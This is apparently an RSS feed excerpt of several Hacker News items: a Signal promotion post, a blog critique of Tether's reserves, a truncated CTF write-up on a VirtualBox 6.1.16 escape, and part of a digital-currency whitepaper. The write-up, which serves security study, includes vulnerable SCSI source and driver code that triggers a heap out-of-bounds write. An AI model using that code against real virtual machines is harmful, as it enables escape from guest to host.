<p><a href="https://teddit.net/user/JordyEGNL/">u/JordyEGNL</a> submitted an animated version of the EN (for EU citizens) status: <a href="https://teddit.net/r/signal/comments/kx4msl/i_transformed_the_pictures_of_ucrazylizards_post/">check it out</a> !</p>

<p><a href="https://teddit.net/u/candiesdoodle">u/candiesdoodle</a> submitted an animated version of the EN (outside EU) status: <a href="https://filehorst.de/download_mobile.php?file=dxaFzAvF">check it out</a> !</p>

<p><strong>Blank first slide</strong></p>

<p>Some of you asked if I can post the first slide with no text. <a href="https://imgbox.com/g/0FtNwMdC8P">Here it is</a>. Have fun.</p>



<p>The images linked above are published under the <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0 1.0 Universal (CC0 1.0) Public Domain Dedication</a>. Do whatever you want. No attribution required. Happy sharing!</p>

<p>‚Äã</p>

<p>Edit: Removed a weak argument on slide 19 about Telegram. Danke <a href="https://teddit.net/u/A2DreppiD">u/A2DreppiD</a> !</p>

<p>Edit2: Thanks for my first award ever <a href="https://teddit.net/u/TravellingTARDIS">u/TravellingTARDIS</a> !</p>

<p>Edit3: TIL Reddit for iPad messes up my markdown. Sry for that.</p>

<p>Edit4: <strong>THANK YOU ALL FOR THE AWARDS!</strong> Really appreciate it! I'm overwhelmed by the positive feedback and happy to hear that it helped a lot of you. Also: RIP inbox. Sry if I can't reply to all of your comments!</p>

<p>Edit5: there was a line missing in my pastebin for slide 03, thx <a href="https://teddit.net/u/TovaX">u/TovaX</a></p>

<p>Edit6: Added a how-to because many of you asked how to add multiple images to your status!</p>

<p>Edit7: Linked to Signal status page. New animated EN (outside EU) version!</p>
</div><!-- SC_ON --></div></div>]]>
            </description>
            <link>https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796535</guid>
            <pubDate>Fri, 15 Jan 2021 21:10:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tether: Unchained Credit on the Blockchain]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25796336">thread link</a>) | @dgellow
<br/>
January 15, 2021 | http://www.tr0lly.com/tether/tether-unchained-credit-on-the-blockchain/ | <a href="https://web.archive.org/web/*/http://www.tr0lly.com/tether/tether-unchained-credit-on-the-blockchain/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-557">
	
	<div>
		
<p>Peter McCormack‚Äôs podcast with Paolo Ardoino and Stuart Hoegner from Tether/Bitfinex did shed some light on Tether‚Äôs operations. Stuart Hoegner, the general counsel, answered most of the questions. Given his position, the devil wasn‚Äôt in what he said, but how he said it.</p>



<p>Overall, it was a performance of deflecting questions, making legally true statements, and trying to sound legit AF while accusing ‚Äúnocoiners‚Äù of creating ‚ÄúFUD‚Äù. Tether really needed to rebuild some goodwill with the coiner community.</p>



<h2>Customers aren‚Äôt users</h2>



<p>Paolo Ardoino, while explaining how Tether can issue USDTs on weekends, says: </p>



<blockquote><p>‚Äúmost of our, uh, biggest customers are banked into the same bank (as Tether, i.e. Deltec)‚Äù. </p><cite>Paolo Ardoino</cite></blockquote>



<p>It‚Äôs revealing how he paused after ‚Äúmost of our‚Äù, as he was about to say ‚Äúmost of our customers‚Äù ‚Äì which would have been very weird. How come those hundreds of thousands of people who use USDTs all over the world could ALL have an account at a small banking institution in the Cayman Islands?</p>



<p>In fact, it‚Äôs not weird at all ‚Äì Tether is calling ‚Äúcustomers‚Äù a very small number of actual users, the ones Tether is issuing USDTs. The rest aren‚Äôt customers, they‚Äôre users. The distinction is very important, for Tether also says that they perform complete AML and KYC on their customers. This means that they know who are the people (some exchanges and OTC desks) to whom they issue USDTs; but after that first step, feel free to do whatever you want, the blockchain is your oyster!</p>



<p>Stuart also points out at the end of the interview that they don‚Äôt have US customers. Which also makes his claim that they‚Äôre regulated by FinCEN much less grand ‚Äì after all, it‚Äôs not that hard to comply with regulations when none apply.</p>



<h2>Reserves are YOLO</h2>



<h3>Reserves? We definitely have some</h3>



<p>At the time Stuart had to swear on the NYAG affidavit, he admitted that Tether‚Äôs reserves were 74% cash and equivalents, the rest being an IOU from Bitfinex. He says, ‚ÄúUSDTs are 100% backed by reserves, so the loan to Bitfinex is still good backing‚Äù, and later on, ‚Äúso maybe people object to the amount of the backing, but it‚Äôs not nothing‚Äù. Oh it‚Äôs not nothing, case closed!</p>



<p>One thing is clear ‚Äì these reserves aren‚Äôt cash. It can be whatever Tether wants, valued at prices convenient to them:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51.png 618w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51-300x201.png 300w" sizes="(max-width: 618px) 100vw, 618px"><figcaption>source: tether.to/legal</figcaption></figure>



<p>The rule of thumb is, whenever Tether talks about dollars, they don‚Äôt actually talk about dollars, but about their reserves, which aren‚Äôt dollars. Stuart says, </p>



<blockquote><p>‚Äú[at the time of the affidavit,] other than $2.1B in reserves (and today, just for context, that amount has grown to $22B), Tether had cash and cash equivalents on hand representing approximately 74% of the current outstanding USDTs). Just note that that loan is now $550m out of almost $22B in reserves ‚Äì 2.5% of the total.‚Äù </p><cite>Stuart Hoegner</cite></blockquote>



<p>So we know the nature of 2.5% of their overall reserves ‚Äì it‚Äôs the Bitfinex loan ‚Äì but that doesn‚Äôt mean that the rest is cash. Why focus so much on such a small portion of their portfolio, then, if it isn‚Äôt to distract?</p>



<p>If you listened to the interview, you must have noticed how carefully Stuart is wording what he says, and the result is certainly very confusing for the average listener, who is entitled to believe they really have the $22 billion. I certainly heard exactly that, until I rewinded and listened to Stuart speak all over again.</p>



<h3>Backed by loans, like fiat</h3>



<p>Stuart also mentions ‚Äúthird party loans‚Äù as part of their reserves, like the loan to Bitfinex. Which is exactly how the fiat banking system works: banks will credit your account with new dollars if you sign an IOU. And it could very well explain how Tether ended up with a Bitfinex loan in the first place: Bitfinex needed 850m USDTs, didn‚Äôt have $850m, but simply signed an IOU for $850m. If you‚Äôve seen the document, where Giancarlo Devasini, CFO of Tether and Bitfinex, signs both for Tether and Bitfinex, it‚Äôs epic.</p>



<p>Tether‚Äôs select few customers can access the USDT printer without any cash, and use the new USDTs for whatever they want. And you still wonder why Bitcoin has gone parabolic lately?</p>



<h2>Pumping Bitcoin</h2>



<h3>Tether owns Bitcoin, and they don‚Äôt want to say why</h3>



<p>Peter McCormack asks them, point blank, if they own Bitcoin, and if they use Tether to pump Bitcoin.</p>



<p>As per the affidavit, Stuart confirms that they own Bitcoin: </p>



<blockquote><p>‚Äúpart of it is in Bitcoin; if nothing else, there are transaction fees, that need to be paid on the OMNI layer‚Ä¶ we don‚Äôt presently comment on our asset makeup, overall, but we are contemplating starting a process of providing updates on that on the website this year‚Äù.</p><cite>Stuart Hoegner</cite></blockquote>



<p>Note how Stuart doesn‚Äôt say that the only Bitcoin they have is for the OMNI layer transactions. So they have other Bitcoin as well? And by the way, why are supposedly segregated customer assets being used to pay for operational costs?</p>



<p>Peter insists, ‚ÄúWhat‚Äôs the process of the Bitcoin reaching your basket?‚Äù, and this time Stuart deflects, ‚ÄúPaolo, do you have any comments on that?‚Äù</p>



<p>Left alone neck deep in shit by his lawyer, Paolo has no choice but to ask Peter to change the question: </p>



<blockquote><p>‚ÄúWell, ummm‚Ä¶ so‚Ä¶ I‚Äôm not sure if the question is really clear. Are we talking about how we acquired the Bitcoin that we need to fulfil the OMNI layer transactions?‚Äù</p><cite>Paolo Ardoino</cite></blockquote>



<p>No Paolo, the question was why do you have Bitcoin in your reserves, not why you have a few Bitcoin for clear operational reasons. Why don‚Äôt you want to answer it?</p>



<h3>Tether buys Bitcoin, and they don‚Äôt want to say it</h3>



<p>When McCormack asks Stuart if they buy Bitcoin on the market, ‚Äúat the right time‚Äù, and then pump it with Tethers, Stuart replies, </p>



<blockquote><p>‚Äúwe don‚Äôt have the ability to buy Bitcoin at the right time in the market, we‚Äôre not prognosticators about wether the market‚Äôs gonna go up or down, that presumes some level of clairvoyance which we don‚Äôt have‚Äù. </p><cite>Stuart Hoegner</cite></blockquote>



<p>Well OK but the question wasn‚Äôt if you can see the future, but if you buy Bitcoin ‚Äì why deflect it in such a weird way?</p>



<p>Peter insists ‚Äúpeople say that you have the ability to pump the market by issuing Tethers‚Äù, to which Stuart replies, ‚ÄúWe don‚Äôt issue Tethers to buy Bitcoin. We issue Tethers to customers who want Tethers.‚Äù So if a customer that happens to be Bitfinex wants to pump Bitcoin with USDT, that‚Äôs fine.</p>



<p>Then Paolo answers with its own rhetorical question.</p>



<blockquote><p>‚ÄúThe entire concept of us issuing Tethers to buy Bitcoins for ourselves doesn‚Äôt make sense. Why issue Tethers when we already have the dollars, and we have the ability to manage our inventory and out portfolio, when we could just use the dollars? The entire narrative is completely nonsense. Why do we have to do two steps when we can do one?‚Äù</p><cite>Paolo Ardoino</cite></blockquote>



<p>To answer Paolo‚Äôs rhetorical question with another rhetorical question, may I venture,</p>



<blockquote><p>‚ÄúWhy buy Bitcoins with real dollars, which are hard to get by, when you can simply print 20,000,000,000 USDTs that cost you nothing? Is it really because you‚Äôre too busy and want to save one <em>step</em>?‚Äù</p><cite>Trolly McTrollface</cite></blockquote>



<h2>No (unmet) redemptions</h2>



<p>Stuart boasts that all USDT redemption requests have always been met. Well, given Tether‚Äôs contract, that‚Äôs a pretty low bar:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16.png 640w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16-300x73.png 300w" sizes="(max-width: 640px) 100vw, 640px"><figcaption>Sure we will redeem, just not right now ‚Äì but we‚Äôre not rejecting your request!</figcaption></figure>



<p>The <a href="http://tether.to/legal">whole USDT contract is just incredible</a>, when you read it. USDTs aren‚Äôt legal claims on Tether‚Äôs reserves. Maybe they are for Tether‚Äôs customers, who might have signed a different agreement with Tether. But if you‚Äôre not a Tether customer, USDTs are just digital toilet paper. You might be left with it forever on the blockchain, as a stark reminder that database entries without a contract in the real world, are utterly worthless.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

			
</article><!-- #post-${ID} -->

	<nav role="navigation">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>http://www.tr0lly.com/tether/tether-unchained-credit-on-the-blockchain/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796336</guid>
            <pubDate>Fri, 15 Jan 2021 20:56:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Escaping VirtualBox 6.1: Part 1]]>
            </title>
            <description>
<![CDATA[
Score 313 | Comments 44 (<a href="https://news.ycombinator.com/item?id=25795731">thread link</a>) | @lima
<br/>
January 15, 2021 | https://secret.club/2021/01/14/vbox-escape.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/14/vbox-escape.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>This post is about a VirtualBox escape for the latest currently available version (VirtualBox 6.1.16 on Windows). The vulnerabilities were discovered and exploited by our team <a href="https://twitter.com/Sauercl0ud">Sauercl0ud</a> as part of the <a href="https://realworldctf.com/">RealWorld CTF 2020/2021</a>.</p><p>The vulnerability was known to the organizers, requires the guest to be able to insert kernel modules and isn‚Äôt exploitable on default configurations of VirtualBox so the impact is very limited.</p><p>Many thanks to the organizers for hosting this great competition, especially to ChenNan for creating this challenge, <a href="https://twitter.com/M4x_1997">M4x</a> for always being helpful, answering our questions and sitting with us through the many demo attempts and of course all <a href="#credits">the people involved</a> in writing the exploit.</p><p>Let‚Äôs get to some pwning :D</p><h2 id="discovering-the-vulnerability"> <a href="#discovering-the-vulnerability">Discovering the Vulnerability</a></h2><p>The challenge description already hints at where a bug might be:</p><blockquote><p>Goal:</p><p>Please escape VirtualBox and spawn a calc(‚ÄúC:\Windows\System32\calc.exe‚Äù) on the host operating system.</p><p>You have the full permissions of the guest operating system and can do anything in the guest, including loading drivers, etc.</p><p>But you can‚Äôt do anything in the host, including modifying the guest configuration file, etc.</p><p><strong>Hint: SCSI controller is enabled and marked as bootable.</strong></p><p>Environment:</p><p>In order to ensure a clean environment, we use virtual machine nesting to build the environment. The details are as follows:</p><ul><li>VirtualBox:6.1.16-140961-Win_x64.</li><li>Host: Windows10_20H2_x64 Virtual machine in Vmware_16.1.0_x64.</li><li>Guest: Windows7_sp1_x64 Virtual machine in VirtualBox_6.1.16_x64.</li></ul></blockquote><p>The only special thing about the VM is that the <code>SCSI</code> driver is loaded and marked bootable so that‚Äôs the place for us to start looking for vulnerabilities.</p><p>Here are the operations the <code>SCSI</code> device supports:</p><pre><code><span>// /src/VBox/Devices/Storage/DevBusLogic.cpp</span>
    
    <span>// [...]</span>

    <span>if</span> (fBootable)
    {
        <span>/* Register I/O port space for BIOS access. */</span>
        rc <span>=</span> PDMDevHlpIoPortCreateExAndMap(pDevIns, BUSLOGIC_BIOS_IO_PORT, <span>4</span> <span>/*cPorts*/</span>, <span>0</span> <span>/*fFlags*/</span>,
                                           buslogicR3BiosIoPortWrite,       <span>// Write a byte</span>
                                           buslogicR3BiosIoPortRead,        <span>// Read a byte</span>
                                           buslogicR3BiosIoPortWriteStr,    <span>// Write a string</span>
                                           buslogicR3BiosIoPortReadStr,     <span>// Read a string</span>
                                           <span>NULL</span> <span>/*pvUser*/</span>,
                                           <span>"BusLogic BIOS"</span> , <span>NULL</span> <span>/*paExtDesc*/</span>, <span>&amp;</span>pThis<span>-&gt;</span>hIoPortsBios);
        <span>// [...]</span>
    }
    <span>// [...]</span>
</code></pre><p>The <code>SCSI</code> device implements a simple state machine with a global heap allocated buffer. When initiating the state machine, we can set the buffer size and the state machine will set a global buffer pointer to point to the start of said buffer. From there on, we can either read one or more bytes, or write one or more bytes. Every read/write operation will advance the buffer pointer. This means that after reading a byte from the buffer, we can‚Äôt write that same byte and vice versa, because the buffer pointer has already been advanced.</p><p>While auditing the <code>vboxscsiReadString</code> function, <a href="https://twitter.com/_tsuro">tsuro</a> and <a href="https://twitter.com/__spq__">spq</a> found something interesting:</p><pre><code><span>// src/VBox/Devices/Storage/VBoxSCSI.cpp</span>

<span>/**
 * @retval VINF_SUCCESS
 */</span>
<span>int</span> vboxscsiReadString(PPDMDEVINS pDevIns, PVBOXSCSI pVBoxSCSI, <span>uint8_t</span> iRegister,
                       <span>uint8_t</span> <span>*</span>pbDst, <span>uint32_t</span> <span>*</span>pcTransfers, <span>unsigned</span> cb)
{
    RT_NOREF(pDevIns);
    LogFlowFunc((<span>"pDevIns=%#p pVBoxSCSI=%#p iRegister=%d cTransfers=%u cb=%u</span><span>\n</span><span>"</span>,
                 pDevIns, pVBoxSCSI, iRegister, <span>*</span>pcTransfers, cb));

    <span>/*
     * Check preconditions, fall back to non-string I/O handler.
     */</span>
    Assert(<span>*</span>pcTransfers <span>&gt;</span> <span>0</span>);

    <span>/* Read string only valid for data in register. */</span>
    AssertMsgReturn(iRegister <span>==</span> <span>1</span>, (<span>"Hey! Only register 1 can be read from with string!</span><span>\n</span><span>"</span>), VINF_SUCCESS);

    <span>/* Accesses without a valid buffer will be ignored. */</span>
    AssertReturn(pVBoxSCSI<span>-&gt;</span>pbBuf, VINF_SUCCESS);

    <span>/* Check state. */</span>
    AssertReturn(pVBoxSCSI<span>-&gt;</span>enmState <span>==</span> VBOXSCSISTATE_COMMAND_READY, VINF_SUCCESS);
    Assert(<span>!</span>pVBoxSCSI<span>-&gt;</span>fBusy);

    RTCritSectEnter(<span>&amp;</span>pVBoxSCSI<span>-&gt;</span>CritSect);
    <span>/*
     * Also ignore attempts to read more data than is available.
     */</span>
    <span>uint32_t</span> cbTransfer <span>=</span> <span>*</span>pcTransfers <span>*</span> cb;
    <span>if</span> (pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>&gt;</span> <span>0</span>)
    {
        Assert(cbTransfer <span>&lt;=</span> pVBoxSCSI<span>-&gt;</span>cbBuf);     <span>// --- [1] ---</span>
        <span>if</span> (cbTransfer <span>&gt;</span> pVBoxSCSI<span>-&gt;</span>cbBuf)
        {
            memset(pbDst <span>+</span> pVBoxSCSI<span>-&gt;</span>cbBuf, <span>0xff</span>, cbTransfer <span>-</span> pVBoxSCSI<span>-&gt;</span>cbBuf);
            cbTransfer <span>=</span> pVBoxSCSI<span>-&gt;</span>cbBuf;  <span>/* Ignore excess data (not supposed to happen). */</span>
        }

        <span>/* Copy the data and adance the buffer position. */</span>
        memcpy(pbDst, 
               pVBoxSCSI<span>-&gt;</span>pbBuf <span>+</span> pVBoxSCSI<span>-&gt;</span>iBuf,  <span>// --- [2] ---</span>
               cbTransfer);

        <span>/* Advance current buffer position. */</span>
        pVBoxSCSI<span>-&gt;</span>iBuf      <span>+=</span> cbTransfer;
        pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>-=</span> cbTransfer;         <span>// --- [3] ---</span>

        <span>/* When the guest reads the last byte from the data in buffer, clear
           everything and reset command buffer. */</span>

        <span>if</span> (pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>==</span> <span>0</span>)              <span>// --- [4] ---</span>
            vboxscsiReset(pVBoxSCSI, <span>false</span> <span>/*fEverything*/</span>);
    }
    <span>else</span>
    {
        AssertFailed();
        memset(pbDst, <span>0</span>, cbTransfer);
    }
    <span>*</span>pcTransfers <span>=</span> <span>0</span>;
    RTCritSectLeave(<span>&amp;</span>pVBoxSCSI<span>-&gt;</span>CritSect);

    <span>return</span> VINF_SUCCESS;
}
</code></pre><p>We can fully control <code>cbTransfer</code> in this function. The function initially makes sure that we‚Äôre not trying to read more than the buffer size <code>[1]</code>. Then, it copies <code>cbTransfer</code> bytes from the global buffer into another buffer <code>[2]</code>, which will be sent to the guest driver. Finally, <code>cbTransfer</code> bytes get subtracted from the remaining size of the buffer <code>[3]</code> and if that remaining size hits zero, it will reset the SCSI device and require the user to reinitiate the machine state, before reading any more bytes.</p><p>So much for the logic, but what‚Äôs the issue here? There is a check at <code>[1]</code> that ensures no single read operation reads more than the buffer‚Äôs size. But this is the wrong check. It should verify, that no single read can read more than the buffer <strong>has left</strong>. Let‚Äôs say we allocate a buffer with a size of 40 bytes. Now we call this function to read 39 bytes. This will advance the buffer pointer to point to the 40th byte. Now we call the function again and tell it to read 2 more bytes. The check in <code>[1]</code> won‚Äôt bail out, since 2 is less than the buffer size of 40, however we will have read 41 bytes in total. Additionally, this will cause the subtraction in <code>[3]</code> to underflow and <code>cbBufLeft</code> will be set to <code>UINT32_MAX-1</code>. This same <code>cbBufLeft</code> will be checked when doing write operations and since it is very large now, we‚Äôll be able to also write bytes that are outside of our buffer.</p><h2 id="getting-oob-readwrite"> <a href="#getting-oob-readwrite">Getting OOB read/write</a></h2><p>We understand the vulnerability, so it‚Äôs time to develop a driver to exploit it. Ironically enough, the ‚Äúgetting a driver to build‚Äù part was actually one of the hardest (and most annoying) parts of the exploit development. <a href="https://twitter.com/fktio">malle</a> got to building VirtualBox from source in order for us to have symbols and a debuggable process while <a href="https://twitter.com/0x4d5aC">0x4d5a</a> came up with the idea of using the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a> driver as a base for us to work with, since it does some similar things to what we need. Now let‚Äôs finally start writing some code.</p><p>Here‚Äôs how we triggered the bug:</p><pre><code><span>void</span> exploit() {
    <span>static</span> <span>const</span> <span>uint8_t</span> cdb[<span>1</span>] <span>=</span> {<span>0</span>};
    <span>static</span> <span>const</span> <span>short</span> port <span>=</span> <span>0x434</span>;
    <span>static</span> <span>const</span> <span>uint32_t</span> buffer_size <span>=</span> <span>1024</span>;

    <span>// reset the state machine</span>
    __outbyte(port<span>+</span><span>3</span>, <span>0</span>);

    <span>// initiate a write operation</span>
    __outbyte(port<span>+</span><span>0</span>, <span>0</span>); <span>// TargetDevice (0)</span>
    __outbyte(port<span>+</span><span>0</span>, <span>1</span>); <span>// direction (to device)</span>
    
    __outbyte(port<span>+</span><span>0</span>, ((buffer_size <span>&gt;&gt;</span> <span>12</span>) <span>&amp;</span> <span>0xf0</span>) <span>|</span> (<span>sizeof</span>(cdb) <span>&amp;</span> <span>0xf</span>)); <span>// buffer length hi &amp; cdb length</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size);                                        <span>// bugger length low</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size <span>&gt;&gt;</span> <span>8</span>);                                   <span>// buffer length mid</span>
    
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(cdb); i<span>++</span>)
        __outbyte(port<span>+</span><span>0</span>, cdb[i]);


    <span>// move the buffer pointer to 8 byte after the buffer and the remaining bytes to -8</span>
    <span>char</span> buf[buffer_size];
    __inbytestring(port<span>+</span><span>1</span>, buf, buffer_size <span>-</span> <span>1</span>)    <span>// Read bufsize-1</span>
    __inbytestring(port<span>+</span><span>1</span>, buf, <span>9</span>)                  <span>// Read 9 more bytes</span>

    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(buf); i <span>+=</span> <span>4</span>)
        <span>*</span>((<span>uint32_t</span><span>*</span>)(<span>&amp;</span>buf[i])) <span>=</span> <span>0xdeadbeef</span>
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>10000</span>; i<span>++</span>)
        __outbytestring(port<span>+</span><span>1</span>, buf, <span>sizeof</span>(buf))
}

</code></pre><p>The driver first has to initiate the <code>SCSI</code> state machine with a <code>bufsize</code>. Then we read <code>bufsize-1</code> bytes and then we read 9 bytes. We chose 9 instead of 2 byte in order to have the buffer pointer 8 byte aligned after the overflow. Finally, we overwrite the next 10000kb after our allocated <code>buffer+8</code> with <code>0xdeadbeef</code>.</p><p>After loading this driver in the win7 guest, this is what we get: <img src="https://secret.club/assets/sauercl0ud/VM-aborted.png" alt=""></p><p>As expected, the VM crashes because we corrupted the heap. Now we know that our OOB read/write works and since working with drivers was annoying, we decided to modify the driver one last time to expose the vulnerability to user-space. The driver was modified to accept this <code>Req</code> struct via an <code>IOCTL</code>:</p><pre><code><span>enum</span> operations {
    OPERATION_OUTBYTE <span>=</span> <span>0</span>,
    OPERATION_INBYTE <span>=</span> <span>1</span>,
    OPERATION_OUTSTR <span>=</span> <span>2</span>,
    OPERATION_INSTR <span>=</span> <span>3</span>,
};

<span>typedef</span> <span>struct</span> {
    <span>volatile</span> <span>unsigned</span> <span>int</span> port;
    <span>volatile</span> <span>unsigned</span> <span>int</span> operation;
    <span>volatile</span> <span>unsigned</span> <span>int</span> data_byte_out;
} Req;
</code></pre><p>This enables us to use the driver as a bridge to communicate with the <code>SCSI</code> device from any user-space program. This makes exploit prototyping a whole lot faster and has the added benefit of removing the need to touch Windows drivers ever again (well, for the rest of this exploit anyway :D).</p><p>The bug gives us a liner heap OOB read/write primitive. Our goal is to get from here to arbitrary code execution so let‚Äôs put this bug to use!</p><h2 id="leaking-vboxcdll-and-heap-addresses"> <a href="#leaking-vboxcdll-and-heap-addresses">Leaking <code>vboxc.dll</code> and heap addresses</a></h2><p>We‚Äôre able to dump heap data using our OOB read but we‚Äôre still far from code execution. This is a good point to start ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://secret.club/2021/01/14/vbox-escape.html">https://secret.club/2021/01/14/vbox-escape.html</a></em></p>]]>
            </description>
            <link>https://secret.club/2021/01/14/vbox-escape.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25795731</guid>
            <pubDate>Fri, 15 Jan 2021 20:13:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital currency where the money supply is based on participation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25795697">thread link</a>) | @nealbozeman
<br/>
January 15, 2021 | https://nealbozeman.com/chances-whitepaper | <a href="https://web.archive.org/web/*/https://nealbozeman.com/chances-whitepaper">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-326">
	<!-- .entry-header -->

	
	<div>
		
<p><strong>Abstract</strong>: To the question, ‚Äúwhat features would make for an ideal, highly transactable, universally adopted digital currency?‚Äù we explore major limitations with existing cryptocurrencies and propose a digital money called CHANCES.</p>



<h2>What is the ideal currency?</h2>



<p>The ideal currency would have stable prices, an elastic and predictable money supply, no transaction costs, and be widely obtainable by participants in any economy. We consider the relationships between wealth, assets, and money, and propose CHANCES as a better currency than traditional fiat and cryptos, and we take full advantage of an all digital currency.</p>



<h2>CHANCES‚Ä¶</h2>



<p>‚Ä¶ pegs the money supply to the total number of verified participants.</p>



<p>‚Ä¶ gives 1.000.000 (one-million) c$ to every new verified participant</p>



<p>‚Ä¶ allows one and only one authentic registration (participants cannot sign up more than once)</p>



<p>‚Ä¶ continuously replenishes verified accounts below 1.000.000 c$ (without inflating money supply, at up to 10.000 c$ monthly)</p>



<p>‚Ä¶ slowly draws money from accounts over 1.000.000 c$ (at a rate of less than 1% per month)</p>



<p>‚Ä¶ has no transaction fees, no miners, can reverse fraudulent transactions, and insure deposits.</p>



<h2>Why?</h2>



<p>Money is in all ways relative. It is not wealth, in and of itself, so what is it?</p>



<p>CHANCES supposes that in modern, western economies, which are roughly 2/3rds service based, money mainly represents economic potential, such as the ability to command someone‚Äôs attention to perform labor or a service or to create something to be consumed. CHANCES explicitly draws on this connection by supposing that 1.) the money supply represents the total economic potential of all participants in an economy, 2.) that a unit of money represents some portion of potential thereof, and 3.) since the economic value is different between each participant, the function of the marketplace is to continuously discover these relative values and adjust money flows (income and prices) proportionately. For example, a doctor might be paid more than a car mechanic, which is what the marketplace participants are free to discover.</p>



<p>CHANCES looks at money as economic potential, and considers that it must be replenished continuously through the economy and that high participation optimizes choice and competition in a marketplace.</p>



<p>We suppose that the initial allotment of 1.000.000 c$ is approximately 8.5 years of average potential economic value of any random individual. Initial allotments help produce new capital pools to be used in organized endeavors within the economy and can be used to expand money supply through through lending and borrowing.</p>



<p>10.000 c$ is distributed to all identity-verified accounts monthly to replenish participation capability in the economy, and proves each verified participant credit worthy. This distribution is funded by simultaneously drawing 1% monthly from all account balances. This has the following effect on verified account balances:</p>



<figure><table><tbody><tr><td><strong>Starting balance</strong></td><td><strong>Monthly change</strong></td></tr><tr><td>0</td><td>+ 10.000 c$</td></tr><tr><td>500.000</td><td>+ 5.000 c$</td></tr><tr><td>1.000.000</td><td>no change</td></tr><tr><td>1.500.000</td><td>‚Äì 5.000 c$</td></tr><tr><td>2.000.000</td><td>‚Äì 10.000 c$</td></tr></tbody></table></figure>



<p>Unverified and anonymous accounts may exist, however, they are not given an initial allotment and do not receive any monthly benefit. Additionally, they are still subject to the 1% universal draw-down and they do not affect the base money supply.</p>



<h2><strong>Money supply</strong></h2>



<p>Pegging money supply to number of verified participants (benefactors) is a novel way to to keep prices stable while encouraging the network to grow. There is no hold and wait incentive that shows up in traditional cryptocurrencies, and there is no late-adopter penalty where people who come in later pay more to enter.</p>



<p>The following shows the relationship between verified participants and the money supply. </p>



<figure><table><tbody><tr><td><strong>Accounts</strong></td><td><strong>Base Money Supply (in millions)</strong></td><td><strong>Relative Value</strong></td></tr><tr><td>1 verified account<br>1 wallet</td><td>1 c$</td><td>1</td></tr><tr><td>1 verified account<br>100 wallets</td><td>1 c$</td><td>1</td></tr><tr><td>1000 verified accounts<br>10.952 wallets</td><td>1.000 c$</td><td>1</td></tr><tr><td>365.000.000 verified accounts<br>1bln wallets</td><td>365.000.000 c$</td><td>1</td></tr><tr><td>8 bln verified accounts<br>100 bln wallets</td><td>8.000.000.000 c$</td><td>1</td></tr></tbody></table></figure>



<p>Operating and maintaining this public, not for profit network will require overhead. We propose that internal accounts will be created and tied exclusively to a CHANCES Foundation. These accounts will be listed publicly and used to spend money on the network to cover operational costs which will also be publicly posted. Internally used accounts will be subject to the same 1% draw and replenishment rules. </p>



<h2>Features of Chances</h2>



<figure><table><tbody><tr><td></td><td><strong>Chances</strong></td><td><strong>Bitcoin</strong></td></tr><tr><td>Centralized</td><td>Yes</td><td>No</td></tr><tr><td>Reversible Transactions</td><td>Yes</td><td>No</td></tr><tr><td>Transaction fees</td><td>None</td><td>Variable/high</td></tr><tr><td>Transaction speed</td><td>Immediate</td><td>*1 hour+</td></tr><tr><td>Deposit insurance</td><td>Yes</td><td>No</td></tr><tr><td>Privacy</td><td>Yes</td><td>No</td></tr><tr><td>Anonymity</td><td>No</td><td>**No</td></tr><tr><td>Money supply</td><td>Elastic</td><td>Constrained</td></tr><tr><td>Price volatility</td><td>Stable</td><td>Volatile</td></tr><tr><td>Transactability</td><td>High</td><td>Low</td></tr><tr><td>Low energy consumption</td><td>Yes</td><td>No</td></tr><tr><td>Cryptographically secure</td><td>Yes</td><td>Yes</td></tr><tr><td>Meaningful</td><td>Yes</td><td>No</td></tr><tr><td>Incentive to spend</td><td>Yes</td><td>No</td></tr></tbody></table><figcaption>* Variable <br>** Functionally, not anonymous.</figcaption></figure>



<h2>Privacy &amp; anonymity</h2>



<p>Anonymity is the ability to transact without exposing identifying information to any counter-party or 3rd-party. Privacy is a degree of protection from having your transactions disclosed to a 3rd-party.</p>



